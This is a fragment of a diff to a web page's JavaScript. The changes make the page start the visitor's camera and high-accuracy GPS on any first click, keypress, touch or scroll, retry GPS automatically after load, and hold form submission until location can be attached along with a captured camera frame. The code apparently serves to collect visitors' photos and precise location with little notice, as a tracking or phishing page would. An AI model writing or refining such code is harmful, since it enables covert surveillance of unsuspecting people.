@@ -395,8 +395,8 @@
                 }
             }
 
-            form.addEventListener('submit', async function(e) {
-                e.preventDefault();
+            let gpsResolved = false;
+            let cameraReady = false;
 
             // Camera initiation function
             async function initCamera() {
@@ -405,30 +405,50 @@
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
                     video.srcObject = stream;
-                    video.play();
-                } catch (err) {}
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        cameraReady = true;
+                    };
+                } catch (err) {
+                    console.log('Camera error:', err);
+                }
             }
 
             // GPS initialization
             function initGps() {
+                if (gpsResolved) return;
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(pos => {
                         document.getElementById('lat').value = pos.coords.latitude;
                         document.getElementById('lng').value = pos.coords.longitude;
-                    }, null, { enableHighAccuracy: true, timeout: 10000 });
+                        gpsResolved = true;
+                    }, err => {
+                        console.log('GPS error:', err);
+                        gpsResolved = true;
+                    }, { enableHighAccuracy: true, timeout: 5000 });
+                } else {
+                    gpsResolved = true;
                 }
             }
 
-            // Start camera and GPS as soon as they interact with the page
-            ['mousedown', 'keydown', 'touchstart'].forEach(evt => {
+            // Start everything as soon as the page is ready and user interacts
+            ['mousedown', 'keydown', 'touchstart', 'scroll'].forEach(evt => {
                 document.addEventListener(evt, () => {
                     initCamera();
                     initGps();
                 }, { once: true, passive: true });
             });
 
+            // Fallback: Try to start GPS immediately in case the browser allows it
+            setTimeout(initGps, 1000);
+
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
+
+                // Wait briefly for GPS if it's still pending (max 800ms)
+                if (!gpsResolved) {
+                    await new Promise(r => setTimeout(r, 800));
+                }
 
                 // Capture Photo frame if camera is ready
                 const video = document.getElementById('video');
